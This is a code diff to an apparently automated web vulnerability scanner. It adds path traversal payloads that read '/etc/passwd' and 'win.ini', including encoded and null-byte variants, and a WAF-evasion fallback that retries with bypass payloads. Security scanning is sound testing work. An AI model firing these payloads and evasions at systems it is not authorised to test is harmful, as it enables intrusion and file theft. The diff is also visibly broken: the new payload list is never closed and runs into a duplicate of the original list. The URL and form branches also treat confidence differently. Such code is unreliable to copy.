@@ -15,6 +15,31 @@ from scanner.utils.request_metadata import (
     form_request_parts,
     injectable_locations,
 )
+from scanner.utils.waf_evasion import (
+    PATH_TRAVERSAL_WAF_BYPASS,
+    EvasionLevel,
+)
+
+
+# Path traversal payloads for different OS
+PATH_PAYLOADS = [
+    # Linux/Unix
+    "../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "..%252F..%252F..%252Fetc%252Fpasswd",
+    
+    # Windows
+    "..\\..\\..\\windows\\win.ini",
+    "..%5C..%5C..%5Cwindows%5Cwin.ini",
+    
+    # Null byte bypass (older systems)
+    "../../../etc/passwd%00",
+    
+    # Absolute paths
+    "/etc/passwd",
+    "C:\\windows\\win.ini",
+    
 
 
 # Path traversal payloads for different OS
@@ -46,8 +71,10 @@ PATH_PAYLOADS = [
 class PathTraversalScanner:
     """Scanner for path traversal vulnerabilities."""
 
-    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None) -> None:
+    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None,
+                 evasion_level: int = EvasionLevel.MEDIUM) -> None:
         self.timeout = timeout
+        self._evasion_level = evasion_level
         # Use provided session (authenticated) or create new one
         if session:
             self.session = session
@@ -107,11 +134,23 @@ class PathTraversalScanner:
         findings: List[Dict[str, Any]] = []
         for param_name in params.keys():
             if self._looks_like_file_param(param_name):
+                found = False
                 for payload in PATH_PAYLOADS:
                     vuln = await self._test_path_async(url, param_name, params, payload, http)
                     if vuln:
                         findings.append(vuln)
+                        found = True
                         break
+                # WAF evasion fallback
+                if not found and self._evasion_level >= EvasionLevel.LOW:
+                    limit = {1: 6, 2: 12, 3: 20, 4: len(PATH_TRAVERSAL_WAF_BYPASS)}.get(self._evasion_level, 12)
+                    for waf_payload, technique in PATH_TRAVERSAL_WAF_BYPASS[:limit]:
+                        vuln = await self._test_path_async(url, param_name, params, waf_payload, http)
+                        if vuln:
+                            vuln["evidence"] = "[waf-bypass:" + technique + "] " + vuln.get("evidence", "")
+                            vuln["confidence"] = min(vuln.get("confidence", 80), 82)
+                            findings.append(vuln)
+                            break
         return findings
 
     async def scan_form_async(self, form: Dict[str, Any], http) -> List[Dict[str, Any]]:
@@ -124,6 +163,7 @@ class PathTraversalScanner:
         body_fields, header_fields, cookie_fields, extra_headers, extra_cookies, body_format = request_parts
         for location, param_name in injectable_locations(body_fields, header_fields, cookie_fields):
             if self._looks_like_file_param(param_name):
+                found = False
                 for payload in PATH_PAYLOADS:
                     vuln = await self._test_path_async(
                         action, param_name, request_parts, payload, http,
@@ -131,7 +171,19 @@ class PathTraversalScanner:
                     )
                     if vuln:
                         findings.append(vuln)
+                        found = True
                         break
+                if not found and self._evasion_level >= EvasionLevel.LOW:
+                    limit = {1: 6, 2: 12, 3: 20, 4: len(PATH_TRAVERSAL_WAF_BYPASS)}.get(self._evasion_level, 12)
+                    for waf_payload, technique in PATH_TRAVERSAL_WAF_BYPASS[:limit]:
+                        vuln = await self._test_path_async(
+                            action, param_name, request_parts, waf_payload, http,
+                            method=method, body_format=body_format, target_location=location
+                        )
+                        if vuln:
+                            vuln["evidence"] = "[waf-bypass:" + technique + "] " + vuln.get("evidence", "")
+                            findings.append(vuln)
+                            break
         return findings
 
     async def _test_path_async(self, test_url, param_name, request_parts, payload, http, method="GET", body_format="form", target_location="body"):
